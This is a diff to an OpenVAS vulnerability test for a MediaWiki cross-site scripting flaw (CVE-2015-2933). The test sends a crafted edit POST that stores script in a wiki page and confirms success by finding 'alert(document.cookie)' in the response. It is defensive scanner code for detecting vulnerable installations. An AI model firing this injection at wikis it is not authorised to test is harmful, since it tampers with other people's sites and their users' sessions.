@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_mediawiki_lang_variants_xss_vuln.nasl 3516 2016-06-14 12:25:12Z mime $
+# $Id: gb_mediawiki_lang_variants_xss_vuln.nasl 5757 2017-03-29 07:29:44Z cfi $
 #
 # MediaWiki Language Variants Cross-site scripting Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:mediawiki:mediawiki";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805387");
-  script_version("$Revision: 3516 $");
+  script_version("$Revision: 5757 $");
   script_cve_id("CVE-2015-2933");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2016-06-14 14:25:12 +0200 (Tue, 14 Jun 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-29 09:29:44 +0200 (Wed, 29 Mar 2017) $");
   script_tag(name:"creation_date", value:"2015-05-19 11:28:49 +0530 (Tue, 19 May 2015)");
   script_name("MediaWiki Language Variants Cross-site scripting Vulnerability");
 
@@ -59,11 +59,11 @@ if(description)
   script_tag(name:"solution", value:"Upgrade to Mediawiki 1.19.24, 1.23.9 or 1.24.2 or later.
   For updates refer to http://www.mediawiki.org");
 
-  script_tag(name:"qod_type", value:"exploit");
+  script_tag(name:"qod_type", value:"remote_active");
   script_tag(name:"solution_type", value:"VendorFix");
+  script_xref(name : "URL" , value : "https://lists.wikimedia.org/pipermail/mediawiki-announce/2015-March/000175.html");
   script_xref(name : "URL" , value : "https://phabricator.wikimedia.org/T73394");
   script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2015/04/07/3");
-  script_summary("Check if MediaWiki is vulnerable to xss");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -73,45 +73,19 @@ if(description)
   exit(0);
 }
 
-##Code starts from here##
-
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-req = "";
-res = "";
-dir = "";
-reqwiki = "";
-reswiki = "";
-wikiPort = "";
+if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
+if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
-## Get HTTP Port
-wikiPort = get_http_port(default:80);
-if(!wikiPort){
-  wikiPort = 80;
-}
-
-## Check the port state
-if(!get_port_state(wikiPort)){
- exit(0);
-}
-
-#Check if host supports php
-if(!can_host_php(port:wikiPort)){
- exit(0);
-}
-
-## Get Mediawiki Location
-if(!dir = get_app_location(cpe:CPE, port:wikiPort)){
-  exit(0);
-}
+if( dir == "/" ) dir = "";
 
 ## Vulnerable Url
-url =dir+"/index.php?title=%E9%A6%96%E9%A1%B5&action=edit";
-reqwiki = http_get(item:url, port:wikiPort);
-reswiki = http_keepalive_send_recv(port:wikiPort, data:reqwiki);
+url = dir + "/index.php?title=%E9%A6%96%E9%A1%B5&action=edit";
+reqwiki = http_get(item:url, port:port);
+reswiki = http_keepalive_send_recv(port:port, data:reqwiki);
 
 ##Check for Vulnerable Language
 wplang = eregmatch(pattern:'lang="([a-zA-Z]*)" ', string:reswiki);
@@ -171,23 +145,26 @@ postData = string('-----------------------------7523421607973306651860038372\r\n
                   'Content-Disposition: form-data; name="wpEditToken"\r\n\r\n+\\\r\n',
                   '-----------------------------7523421607973306651860038372--\r\n');
 
+host = http_host_name( port:port );
+
 #Send Attack Request
 sndReq = string("POST ", url, " HTTP/1.1\r\n",
-                "Host: ", get_host_name(), "\r\n",
+                "Host: ", host, "\r\n",
                 "Content-Type: multipart/form-data;",
                 "boundary=---------------------------7523421607973306651860038372\r\n",
                 "Content-Length: ", strlen(postData), "\r\n\r\n",
                 "\r\n", postData, "\r\n");
-rcvRes = http_send_recv(port:wikiPort, data:sndReq);
+rcvRes = http_keepalive_send_recv(port:port, data:sndReq);
 
-url = dir+"/index.php/%E9%A6%96%E9%A1%B5";
-sndReq = http_get(item:url, port:wikiPort);
-rcvRes = http_keepalive_send_recv(port:wikiPort, data:sndReq);
+url = dir + "/index.php/%E9%A6%96%E9%A1%B5";
+sndReq = http_get(item:url, port:port);
+rcvRes = http_keepalive_send_recv(port:port, data:sndReq);
 
 #Confirm Exploit
-if (rcvRes =~ "HTTP/1\.. 200" && "alert(document.cookie)" >< rcvRes)
-{
-  security_message(wikiPort);
-  exit(0);
+if( rcvRes =~ "HTTP/1\.. 200" && "alert(document.cookie)" >< rcvRes ) {
+  report = report_vuln_url( port:port, url:url );
+  security_message( port:port, data:report );
+  exit( 0 );
 }
 
+exit( 99 );
